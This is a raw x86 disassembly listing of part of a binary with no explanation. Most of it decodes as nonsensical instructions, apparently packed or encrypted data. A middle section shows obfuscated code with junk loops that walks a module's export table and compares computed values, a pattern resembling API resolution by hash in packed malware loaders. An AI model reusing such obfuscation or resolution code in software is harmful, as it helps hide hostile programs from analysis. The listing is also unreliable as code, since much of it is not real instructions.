  40cc4a:	rol    DWORD PTR [edx-0x1b],0x99
  40cc4e:	add    al,0x66
  40cc50:	retf   0x6e27
  40cc53:	sti    
  40cc54:	add    esp,DWORD PTR [ebx-0x69]
  40cc57:	mov    ecx,0x83fc8d76
  40cc5c:	ds jb  0x40ccaa
  40cc5f:	mov    ebp,0xef961c87
  40cc64:	push   edx
  40cc65:	into   
  40cc66:	std    
  40cc67:	(bad)  
  40cc68:	enter  0x4444,0xbe
  40cc6c:	ss jnp 0x40cca2
  40cc6f:	adc    BYTE PTR ds:0x95b8e28d,al
  40cc75:	and    edi,edi
  40cc77:	in     eax,dx
  40cc78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc79:	dec    esi
  40cc7a:	push   ebx
  40cc7b:	fcmovu st,st(0)
  40cc7d:	xchg   esp,eax
  40cc7e:	inc    esi
  40cc7f:	xor    eax,0x230d405e
  40cc84:	inc    edi
  40cc85:	fs popf 
  40cc87:	stos   DWORD PTR es:[edi],eax
  40cc88:	inc    edx
  40cc89:	dec    ebp
  40cc8a:	or     al,0xd7
  40cc8c:	sub    eax,0xecc7c275
  40cc91:	es xor al,0x79
  40cc94:	or     DWORD PTR [ecx],edi
  40cc96:	dec    eax
  40cc97:	jnp    0x40cc74
  40cc99:	retf   0x6ab9
  40cc9c:	out    dx,al
  40cc9d:	xor    al,0xa
  40cc9f:	push   ecx
  40cca0:	(bad)  [edi]
  40cca2:	call   0xc9d82d44
  40cca7:	test   BYTE PTR [esp+ebp*4],dh
  40ccaa:	jl     0x40cd1c
  40ccac:	cmp    DWORD PTR [ebx],edx
  40ccae:	pop    esi
  40ccaf:	add    BYTE PTR [ebp+0x17c94c7e],dh
  40ccb5:	jmp    DWORD PTR [ebp+0x69]
  40ccb8:	xchg   DWORD PTR [edx+0x6e552528],edx
  40ccbe:	jbe    0x40cc81
  40ccc0:	int3   
  40ccc1:	jae    0x40cd23
  40ccc3:	ins    DWORD PTR es:[edi],dx
  40ccc4:	inc    DWORD PTR [ebp+ebp*1-0x3f3e1ac2]
  40cccb:	jnp    0x40cd04
  40cccd:	cs pusha 
  40cccf:	outs   dx,BYTE PTR ds:[esi]
  40ccd0:	jmp    0x40cca9
  40ccd2:	dec    ecx
  40ccd3:	loop   0x40ccea
  40ccd5:	call   0x1e80f038
  40ccda:	and    DWORD PTR [ebx-0x5905aa02],ecx
  40cce0:	mov    ds:0x6ab98068,al
  40cce5:	sub    eax,0x59f639e5
  40ccea:	push   ebp
  40cceb:	test   BYTE PTR [edx-0x98728f3],0x10
  40ccf2:	lock idiv DWORD PTR [esi+0x4785da2c]
  40ccf9:	mov    ebp,0xa1db83c0
  40ccfe:	push   edi
  40ccff:	cmp    BYTE PTR [ebx],bl
  40cd01:	pop    eax
  40cd02:	xor    esi,eax
  40cd04:	sti    
  40cd05:	push   edi
  40cd06:	cmp    edx,DWORD PTR [eax+0x7c150869]
  40cd0c:	out    0xbe,eax
  40cd0e:	xor    dh,cl
  40cd10:	popa   
  40cd11:	sbb    al,0xd5
  40cd13:	sahf   
  40cd14:	jb     0x40cd7e
  40cd16:	fldcw  WORD PTR [esi-0x80]
  40cd19:	nop
  40cd1a:	mov    dl,0x5f
  40cd1c:	arpl   WORD PTR [ebx+0x60],cx
  40cd1f:	cli    
  40cd20:	xchg   ebx,eax
  40cd21:	call   0x4395:0xe930968f
  40cd28:	mov    WORD PTR [edi],gs
  40cd2a:	fsubr  DWORD PTR [ebp+0x0]
  40cd2d:	and    eax,0x81331ca2
  40cd32:	mov    dl,0xa5
  40cd34:	sbb    DWORD PTR [esi-0x74eb7c0],ebx
  40cd3a:	add    ch,bl
  40cd3c:	dec    edx
  40cd3d:	scas   al,BYTE PTR es:[edi]
  40cd3e:	mov    dh,0x44
  40cd40:	cwde   
  40cd41:	das    
  40cd42:	push   esp
  40cd43:	scas   eax,DWORD PTR es:[edi]
  40cd44:	in     eax,dx
  40cd45:	(bad)  
  40cd46:	fnstcw WORD PTR [edi-0x68]
  40cd49:	pop    edx
  40cd4a:	xor    bh,BYTE PTR [eax+0x1075efe6]
  40cd50:	xchg   ebp,eax
  40cd51:	push   0xc823cff4
  40cd56:	fisttp QWORD PTR [ebp-0x57]
  40cd59:	add    ebx,ebp
  40cd5b:	mov    DWORD PTR [edi],ebp
  40cd5d:	cwde   
  40cd5e:	fdiv   DWORD PTR [ebp+0x2871a66b]
  40cd64:	jae    0x40ccef
  40cd66:	adc    ch,BYTE PTR [ebp-0x7c]
  40cd69:	cmp    eax,0xa958c3b9
  40cd6e:	mov    edx,0xceebf915
  40cd73:	cmp    BYTE PTR [ebp+0x76c14a2b],dh
  40cd79:	call   0xf5c3470
  40cd7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd7f:	sub    esp,ebp
  40cd81:	push   0xffffff81
  40cd83:	xchg   DWORD PTR [esi],edx
  40cd85:	(bad)  
  40cd86:	fiadd  DWORD PTR [edi+0x50]
  40cd89:	je     0x40cd24
  40cd8b:	sub    al,0x9a
  40cd8d:	shr    BYTE PTR [edi],0xd0
  40cd90:	push   esi
  40cd91:	pop    ebp
  40cd92:	xor    BYTE PTR [edi-0x59],al
  40cd95:	(bad)  
  40cd96:	pop    es
  40cd97:	mov    edi,DWORD PTR gs:[eax]
  40cd9a:	ret    0x7ec7
  40cd9d:	cmp    eax,0x530d4dbe
  40cda2:	pop    ss
  40cda3:	or     eax,0x66724c2d
  40cda8:	mov    bl,0x25
  40cdaa:	xchg   edx,eax
  40cdab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdac:	sub    eax,0x109d617a
  40cdb1:	sahf   
  40cdb2:	mov    bh,0xe5
  40cdb4:	out    dx,al
  40cdb5:	je     0x40cd91
  40cdb7:	jb     0x40ce0e
  40cdb9:	into   
  40cdba:	and    ah,BYTE PTR ds:0xa3492c23
  40cdc0:	loopne 0x40ce1b
  40cdc2:	mov    eax,0xcc4f108f
  40cdc7:	rol    BYTE PTR [ebp-0x11],cl
  40cdca:	leave  
  40cdcb:	push   esp
  40cdcc:	out    0x3b,eax
  40cdce:	repnz pop eax
  40cdd0:	pop    es
  40cdd1:	shl    DWORD PTR [eax+0x1a],0x8d
  40cdd5:	mov    WORD PTR [esi+0x7b9fbe95],?
  40cddb:	and    ch,BYTE PTR ds:0x4acbc44c
  40cde1:	ficomp WORD PTR [edi-0x58]
  40cde4:	push   edx
  40cde5:	mul    esi
  40cde7:	loop   0x40cda7
  40cde9:	xor    al,0xd4
  40cdeb:	jg     0x40cd75
  40cded:	stos   DWORD PTR es:[edi],eax
  40cdee:	xchg   DWORD PTR [edx+0x30],esp
  40cdf1:	and    esi,DWORD PTR [edx+0x75d0507c]
  40cdf7:	xor    esi,ebp
  40cdf9:	retf   
  40cdfa:	mov    dl,al
  40cdfc:	jl     0x40ce59
  40cdfe:	in     eax,0x26
  40ce00:	aad    0x25
  40ce02:	scas   al,BYTE PTR es:[edi]
  40ce03:	call   0xec055203
  40ce08:	ins    DWORD PTR es:[edi],dx
  40ce09:	jno    0x40cdb1
  40ce0b:	icebp  
  40ce0c:	jne    0x40cdb2
  40ce0e:	mov    eax,0x968f9671
  40ce13:	ja     0x40ce3c
  40ce15:	xor    eax,0xe3b67a8d
  40ce1a:	loopne 0x40ce04
  40ce1c:	jnp    0x40cdb1
  40ce1e:	test   al,0xd0
  40ce20:	fucomip st,st(5)
  40ce22:	xor    cl,BYTE PTR [edi+0x9]
  40ce25:	fisub  WORD PTR [ebx+0x3f]
  40ce28:	and    dh,BYTE PTR [ebx]
  40ce2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce2b:	and    eax,0x161d29b9
  40ce30:	add    ah,dh
  40ce32:	xor    DWORD PTR [ecx],esi
  40ce34:	jg     0x40cead
  40ce36:	xchg   ecx,eax
  40ce37:	dec    edi
  40ce38:	addr16 in eax,0x81
  40ce3b:	aas    
  40ce3c:	shl    BYTE PTR [ebx],1
  40ce3e:	clc    
  40ce3f:	(bad)  
  40ce41:	push   esi
  40ce42:	fwait
  40ce43:	add    ecx,DWORD PTR [eax-0x14b088f5]
  40ce49:	pop    eax
  40ce4a:	scas   eax,DWORD PTR es:[edi]
  40ce4b:	jno    0x40ce6b
  40ce4d:	(bad)  
  40ce4e:	stos   BYTE PTR es:[edi],al
  40ce4f:	mov    esi,0xf023bb38
  40ce54:	xor    ecx,eax
  40ce56:	dec    edi
  40ce57:	and    ebx,DWORD PTR [esi]
  40ce59:	int    0x45
  40ce5b:	or     BYTE PTR [eax],0x9d
  40ce5e:	ja     0x40ced8
  40ce60:	int3   
  40ce61:	xor    al,0xa2
  40ce63:	mov    esi,0x46458acc
  40ce68:	xor    bh,dh
  40ce6a:	ins    DWORD PTR es:[edi],dx
  40ce6b:	ret    
  40ce6c:	jge    0x40cdf3
  40ce6e:	xor    esp,DWORD PTR [ebx+0x4f5a8eaa]
  40ce74:	retf   0x42c1
  40ce77:	inc    edi
  40ce78:	sub    BYTE PTR [ebx+0x6dee91e4],0xe0
  40ce7f:	mov    eax,ds:0xd6c251bb
  40ce84:	js     0x40ced1
  40ce86:	pop    ecx
  40ce87:	or     eax,DWORD PTR [esp+ebp*1]
  40ce8a:	call   0xede7:0x19808d8f
  40ce91:	js     0x40ce16
  40ce93:	pop    edx
  40ce94:	cmovne ecx,DWORD PTR [ecx]
  40ce97:	dec    ecx
  40ce98:	lods   al,BYTE PTR ds:[esi]
  40ce99:	mov    eax,DWORD PTR [ebp-0x4]
  40ce9c:	mov    DWORD PTR ds:0x428eab,0x1e
  40cea6:	cmp    DWORD PTR ds:0x428eab,0x0
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42aa13
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42aa1b
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42aa1f
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42aa23
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42aa27
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax+0x31fa1153]
  40d217:	into   
  40d218:	std    
  40d219:	push   ebp
  40d21a:	rol    BYTE PTR [ebx-0x7c9f0e7d],cl
  40d220:	or     DWORD PTR [ecx-0x533f0132],0x5b
  40d227:	sti    
  40d228:	data16 mov bh,0xe1
  40d22b:	dec    ebp
  40d22c:	cmp    eax,0xcb3a5a7e
  40d231:	clc    
  40d232:	jb     0x40d291
  40d234:	shl    BYTE PTR [ecx],1
  40d236:	push   esp
  40d237:	add    DWORD PTR [edx-0x36],edx
  40d23a:	in     al,0x8a
  40d23c:	je     0x40d259
  40d23e:	pop    ss
  40d23f:	into   
  40d240:	add    BYTE PTR ds:0x78ea6e2d,0xef
  40d247:	mov    eax,0x87362fb0
  40d24c:	xor    al,0x7a
  40d24e:	gs pop ebx
  40d250:	cs push edi
  40d252:	in     eax,dx
  40d253:	and    BYTE PTR [esi-0x2ce1bcb0],0xb6
  40d25a:	mov    ds:0xbe98e6a,eax
  40d25f:	adc    eax,0x5bbd2e0c
  40d264:	in     al,0x7d
  40d266:	rol    BYTE PTR [edi],cl
  40d268:	js     0x40d21d
  40d26a:	lahf   
  40d26b:	and    al,0x3e
  40d26d:	xchg   edx,eax
  40d26e:	sub    BYTE PTR [ecx-0x4475780],0xd0
  40d275:	or     eax,0x638e2c27
  40d27a:	mov    al,0x34
  40d27c:	je     0x40d26a
  40d27e:	imul   DWORD PTR [edi-0x1a49e0dc]
  40d284:	sbb    dl,BYTE PTR [esi-0x200775e2]
  40d28a:	mov    esp,0xbe760093
  40d28f:	pop    ecx
  40d290:	out    0x98,eax
  40d292:	ins    BYTE PTR es:[edi],dx
  40d293:	jmp    0x57bb:0xbb1b9af6
  40d29a:	int    0x5e
  40d29c:	in     al,0xd
  40d29e:	xor    DWORD PTR [eax-0x71],esi
  40d2a1:	and    al,0x44
  40d2a3:	add    cl,al
  40d2a5:	add    eax,0xc46d9ea9
  40d2aa:	jbe    0x40d272
  40d2ac:	out    0xdb,al
  40d2ae:	cdq    
  40d2af:	stc    
  40d2b0:	mov    al,0x69
  40d2b2:	fsubr  DWORD PTR [eax]
  40d2b4:	and    esp,DWORD PTR [esi]
  40d2b6:	(bad)  
  40d2b7:	pop    edx
  40d2b8:	mov    ds:0x3fbe96a7,eax
  40d2bd:	inc    esi
  40d2be:	stos   DWORD PTR es:[edi],eax
  40d2bf:	pushf  
  40d2c0:	jb     0x40d2a3
  40d2c2:	push   ebx
  40d2c3:	push   edi
  40d2c4:	mov    BYTE PTR [edi+0xf],al
  40d2c7:	mov    cl,0x8e
  40d2c9:	int    0x63
  40d2cb:	add    eax,0xd82763de
  40d2d0:	jl     0x40d320
  40d2d2:	or     DWORD PTR ds:0x6fefc2f3,esp
  40d2d8:	fnsave [edx]
  40d2da:	push   es
  40d2db:	gs mov dh,0xe3
  40d2de:	nop
  40d2df:	sub    dl,0xc2
  40d2e2:	mov    al,0x88
  40d2e4:	cli    
  40d2e5:	sub    BYTE PTR [edi+0x50],dl
  40d2e8:	iret   
  40d2e9:	std    
  40d2ea:	(bad)
  40d2ee:	(bad)  
  40d2ef:	jmpw   0x637c
  40d2f3:	shl    ch,0x1f
  40d2f6:	and    bl,BYTE PTR [edi]
  40d2f8:	pop    edx
  40d2f9:	add    al,0xb6
  40d2fb:	xor    ah,dl
  40d2fd:	adc    dl,bl
  40d2ff:	jno    0x40d36e
  40d301:	ds aaa 
  40d303:	test   al,0xf9
  40d305:	repz sbb al,0xae
  40d308:	sbb    dh,BYTE PTR [ebx-0x2f]
  40d30b:	jbe    0x40d312
  40d30d:	pop    ecx
  40d30e:	xor    al,0x81
  40d310:	out    dx,al
  40d311:	sbb    DWORD PTR [edx-0x6671f3d0],edx
  40d317:	xor    al,0xca
  40d319:	stos   DWORD PTR es:[edi],eax
  40d31a:	xor    eax,0xd40f4e77
  40d31f:	lds    ebx,FWORD PTR [ebx-0x34]
  40d322:	lea    ebx,ds:0x50f72952
  40d328:	push   0x69
  40d32a:	popa   
  40d32b:	out    0x49,al
  40d32d:	int    0xd
  40d32f:	inc    ebx
  40d330:	scas   eax,DWORD PTR es:[edi]
  40d331:	stos   BYTE PTR es:[edi],al
  40d332:	scas   eax,DWORD PTR es:[edi]
  40d333:	push   ds
  40d334:	push   ecx
  40d335:	clc    
  40d336:	cmp    DWORD PTR [edi],esi
  40d338:	outs   dx,DWORD PTR ds:[esi]
  40d339:	pop    esi
  40d33a:	sub    ah,BYTE PTR [ebp-0x48d0fbec]
  40d340:	jnp    0x40d33f
  40d342:	sbb    edi,edx
  40d344:	push   esp
  40d345:	xor    DWORD PTR [ebx-0x53],ebp
  40d348:	(bad)  
  40d34a:	mov    bl,ah
  40d34c:	or     DWORD PTR [ebx-0x44],esi
  40d34f:	adc    DWORD PTR [eax],esi
  40d351:	xor    BYTE PTR [ecx],dh
  40d353:	into   
  40d354:	fmul   DWORD PTR [edx+0x4c29bf9d]
  40d35a:	mov    dh,0x92
  40d35c:	test   edx,0x3ed1ab49
  40d362:	jae    0x40d2fa
  40d364:	cmp    bh,dh
  40d366:	inc    edi
  40d367:	mov    eax,ds:0x83d231f8
  40d36c:	inc    ecx
  40d36d:	jnp    0x40d32f
  40d36f:	shr    BYTE PTR [edi+0x184a6803],cl
  40d375:	push   edx
  40d376:	xchg   ebp,eax
  40d377:	fidiv  DWORD PTR [ebx-0x64446112]
  40d37d:	out    0x57,eax
  40d37f:	cmp    al,0xdb
  40d381:	push   0xffffff8e
  40d383:	inc    ecx
  40d384:	div    DWORD PTR ds:0xe19d6642
  40d38a:	call   0xf5cc:0x4e134e0f
  40d391:	cmp    bl,BYTE PTR [ebx-0xc]
  40d394:	outs   dx,DWORD PTR ds:[esi]
  40d395:	fwait
  40d396:	outs   dx,BYTE PTR ds:[esi]
  40d397:	mov    eax,0xbd0f1a97
  40d39c:	pop    esi
  40d39d:	sbb    eax,edx
  40d39f:	or     eax,0x22068584
  40d3a4:	jbe    0x40d383
  40d3a6:	call   0xac80:0x32d5d626
  40d3ad:	dec    esi
  40d3ae:	and    BYTE PTR [esi],0x25
  40d3b1:	lds    edi,FWORD PTR [esi-0x20]
  40d3b4:	jle    0x40d337
  40d3b6:	(bad)  
  40d3b7:	fsub   QWORD PTR [edx]
  40d3b9:	test   eax,0xfc850c5
  40d3be:	out    dx,al
  40d3bf:	sbb    al,0x4
  40d3c1:	popf   
  40d3c2:	jbe    0x40d367
  40d3c4:	mov    al,0x3f
  40d3c6:	sbb    al,0x2b
  40d3c8:	dec    eax
  40d3c9:	sub    esp,ecx
  40d3cb:	inc    esi
  40d3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ce:	sbb    DWORD PTR [ecx+0x6c1c62d2],edi
  40d3d4:	scas   al,BYTE PTR es:[edi]
  40d3d5:	mov    edx,0x8c8484ac
  40d3da:	push   ss
  40d3db:	cs add ebp,ecx
  40d3de:	mov    ecx,0xabb560d8
  40d3e3:	fwait
  40d3e4:	paddb  mm1,QWORD PTR [ecx]
  40d3e7:	sbb    edx,ecx
  40d3e9:	pop    ecx
  40d3ea:	or     eax,0x812dc68
  40d3ef:	or     edx,DWORD PTR [edx]
  40d3f1:	xchg   ebx,eax
  40d3f2:	mov    dh,0x25
  40d3f4:	jne    0x40d45d
  40d3f6:	adc    DWORD PTR [edi],ebx
  40d3f8:	sbb    eax,0x1a7b7cfa
  40d3fd:	lahf   
  40d3fe:	mov    dh,0x47
  40d400:	adc    ebp,esi
  40d402:	jl     0x40d3e7
  40d404:	les    ecx,FWORD PTR es:[esi]
  40d407:	int    0x67
  40d409:	lods   al,BYTE PTR ds:[esi]
  40d40a:	test   DWORD PTR fs:[ebx+edi*2],esi
  40d40e:	inc    ebx
  40d40f:	jns    0x40d393
  40d411:	icebp  
  40d412:	xchg   al,dl
  40d414:	jmp    0x10e6:0xc67fed71
  40d41b:	mov    edi,0x74e63e1e
  40d420:	dec    esp
  40d421:	sub    BYTE PTR [edi+edi*1],bh
  40d424:	pushf  
  40d425:	jo     0x40d3c3
  40d427:	popa   
  40d428:	jbe    0x40d3bd
  40d42a:	xchg   ebp,eax
  40d42b:	gs push ebp
  40d42d:	add    al,0x79
  40d42f:	dec    eax
  40d430:	or     bl,BYTE PTR [ecx+0x30]
  40d433:	xor    ebp,ecx
  40d435:	sbb    bh,BYTE PTR [edi+eax*4-0x7dc6c244]
  40d43c:	mov    ecx,0xad21caac
  40d441:	cdq    
  40d442:	rol    DWORD PTR [esi+ebx*1],1
  40d445:	adc    al,0x55
  40d447:	(bad)  
  40d448:	ds iret 
  40d44a:	pop    ecx
  40d44b:	fsub   QWORD PTR [esi]
  40d44d:	pop    es
  40d44e:	add    al,0x59
  40d450:	stos   DWORD PTR es:[edi],eax
  40d451:	call   0x4e818669
  40d456:	repz ds mov ebx,0xbf02c97
  40d45d:	jnp    0x40d4a4
  40d45f:	les    edx,FWORD PTR [ebx]
  40d461:	lds    ecx,FWORD PTR [ebx+0x2d]
  40d464:	xor    al,0xf4
  40d466:	and    DWORD PTR [eax+0x4f8b5ce9],edx
  40d46c:	cdq    
  40d46d:	cmp    DWORD PTR [edi],ebp
  40d46f:	sbb    ah,dh
  40d471:	ins    BYTE PTR es:[edi],dx
  40d472:	xchg   edi,eax
  40d473:	fldcw  WORD PTR [edi+0x2f4c77f9]
  40d479:	and    bl,BYTE PTR [ecx-0x2]
  40d47c:	cmp    dh,ah
  40d47e:	lea    ebx,[edx+0xfe704d3]
  40d484:	and    al,0x9d
  40d486:	add    al,0x4
  40d488:	push   ss
  40d489:	mov    ds:0xd125389b,al
  40d48e:	ja     0x40d483
  40d490:	jp     0x40d49b
  40d492:	or     eax,0xc9f52f75
  40d497:	cld    
  40d498:	jno    0x40d476
  40d49a:	call   0x3fa0:0x3fa9e5ee
  40d4a1:	xchg   esi,eax
  40d4a2:	addr16 push cs
  40d4a4:	cmp    eax,0x1a2daa74
  40d4a9:	mov    cl,0xee
  40d4ab:	(bad)  
  40d4ac:	repnz push 0x1cdebc0a
  40d4b2:	and    bh,cl
  40d4b4:	(bad)  
  40d4b5:	mov    eax,0x5f93b448
  40d4ba:	sbb    eax,0x427ac733
  40d4bf:	mov    esi,0x92b098a1
  40d4c4:	pop    ss
  40d4c5:	or     DWORD PTR [ebx],edx
  40d4c7:	retf   0xca8f
  40d4ca:	test   DWORD PTR [eax],esp
  40d4cc:	rcr    edx,1
  40d4ce:	push   edi
  40d4cf:	int    0x4
  40d4d1:	mov    cl,0x2a
  40d4d3:	xchg   edx,eax
  40d4d4:	pop    eax
  40d4d5:	sub    eax,0xdfc54b02
  40d4da:	pop    es
  40d4db:	aas    
  40d4dc:	daa    
  40d4dd:	add    BYTE PTR [ebx],0x2c
  40d4e0:	adc    ch,BYTE PTR [ebx+ebx*1-0x2cfd116f]
  40d4e7:	icebp  
  40d4e8:	cmp    edx,0x10
  40d4eb:	sahf   
  40d4ec:	cmp    eax,0xbcddb362
  40d4f1:	js     0x40d489
  40d4f3:	cmp    bh,BYTE PTR [esi+0x3e114ca3]
  40d4f9:	ret    0xaafb
  40d4fc:	xor    al,BYTE PTR [esi+0x7893254c]
  40d502:	push   0xd
  40d504:	lods   al,BYTE PTR ds:[esi]
  40d505:	daa    
  40d506:	mov    dl,0x2
  40d508:	xchg   esp,eax
  40d509:	call   0xcd835d77
  40d50e:	xchg   BYTE PTR [ebx+0x62bd843],dl
